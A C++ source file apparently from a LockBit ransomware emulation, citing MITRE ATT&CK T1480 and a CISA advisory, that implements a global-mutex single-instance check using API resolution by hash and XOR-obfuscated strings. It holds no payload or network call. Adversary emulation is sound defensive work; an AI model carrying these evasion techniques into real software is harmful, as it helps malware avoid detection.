#include "crypto/xor_obfuscation.hpp"
#include "guardrails.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"
#include "crypto/djb2.hpp"
#include <format>

namespace guardrails {

HANDLE h_mutex = NULL;

// Generates mutex name by taking the hex representation of the DJB2 hash of the seed
// and appending it to "Global\". Example: "Global\58d4e671"
std::wstring GenerateMutexName(const std::string& seed) {
    std::string name = std::format("Global\\{:08x}", djb2::djb2(seed.c_str()));
    return string_util::string_to_wstring(name);
}

/*
 * CheckCreateMutex:
 *      About:
 *          Checks for the presence of a global mutex ("Global\<DJB2 hash of seed>") 
 *          to determine if there are multiple concurrent instances of this process 
 *          on the local host. If the function returns true, the current process will 
 *          keep a handle to the mutex, which must be closed prior to termination by 
 *          calling guardrails::ReleaseMutex();
 *          Mutex creation and checks are performed using the CreateMutexW API call.
 *      Result:
 *          Returns true is the mutex does not currently exist - in other words, if
 *          this process is the only LockBit instance running on the local host.
 *          Returns false if the mutex already exists, or if mutex creation fails.
 *      MITRE ATT&CK Techniques:
 *          T1480: Execution Guardrails
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
bool CheckCreateMutex(const std::string& seed) {
    DWORD error_code;
    FP_CreateMutexW createMutexW = (FP_CreateMutexW)winapi_helper::GetAPI(0x6fa13223, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (createMutexW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CreateMutexW. Error code"), error_code));
        return false;
    }

    std::wstring name = GenerateMutexName(seed);
    XorLogger::LogInfo(std::format("{} {}", XOR_LIT("Performing mutex check for mutex"), string_util::wstring_to_string(name)));
    HANDLE h_temp = createMutexW(NULL, false, name.c_str());
    error_code = GetLastError();
    if (h_temp != NULL) {
        if (error_code == ERROR_ALREADY_EXISTS) {
            XorLogger::LogInfo(XOR_LIT("Mutex already exists on system."));
            CloseHandle(h_temp);
            return false;
        } else {
           XorLogger::LogInfo(XOR_LIT("Created fresh mutex."));
           guardrails::h_mutex = h_temp;
           return true;
        }
    } else {
        XorLogger::LogError(std::format("{} {}", XOR_LIT("Failed to create mutex. Error code"), error_code));
        return false;
    }
}

// Release the global mutex, if created
void ReleaseMutex() {
    if (guardrails::h_mutex != NULL) {
        CloseHandle(guardrails::h_mutex);
    }
}

} // namespace